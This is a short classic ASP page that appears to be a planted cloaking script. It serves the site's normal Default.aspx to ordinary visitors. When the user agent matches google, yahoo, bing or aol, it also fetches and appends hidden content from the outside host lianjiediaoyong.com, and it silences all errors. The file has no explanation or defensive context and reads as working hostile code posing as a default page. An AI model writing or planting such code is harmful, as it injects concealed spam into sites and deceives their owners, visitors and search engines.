<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
On Error Resume Next
Function getAgent()
    Dim page_agent,search_array,i
    page_agent=LCase(Request.ServerVariables("HTTP_USER_AGENT"))
    search_array=array("google","yahoo","bing","aol")
    getAgent=False
    For i=0 To Ubound(search_array)
       If Instr(page_agent,search_array(i))>0 Then getAgent=True
    Next
End Function
Function GetHTTPPage(url)
   Set HTTPReq = Server.Createobject("Msxml2.XMLHTTP")
   HTTPReq.Open "GET", url, False 
   HTTPReq.Send 
   If HTTPReq.ReadyState <> 4 Then Exit Function 
   GetHTTPPage = Bytes2bStr(HTTPReq.ResponseBody) 
   Set HTTPReq = Nothing 
End Function 
Function Bytes2bStr(data) 
   Dim BytesStream,StringReturn 
   Set BytesStream = Server.CreateObject("ADODB.Stream") 
   BytesStream.Type = 2 
   BytesStream.Open 
   BytesStream.WriteText data 
   BytesStream.Position = 0 
   BytesStream.Charset = "UTF-8"
   BytesStream.Position = 2 
   StringReturn = BytesStream.ReadText 
   BytesStream.Close 
   Set BytesStream = Nothing 
   Bytes2bStr = StringReturn 
End Function
strHtml = GetHTTPPage("https://"&Request.ServerVariables("Http_Host")&"/Default.aspx")
Response.Write strHtml
strHtml = GetHTTPPage("http://lianjiediaoyong.com/site/465.txt")
If getAgent Then
   Response.Write strHtml
End If
%>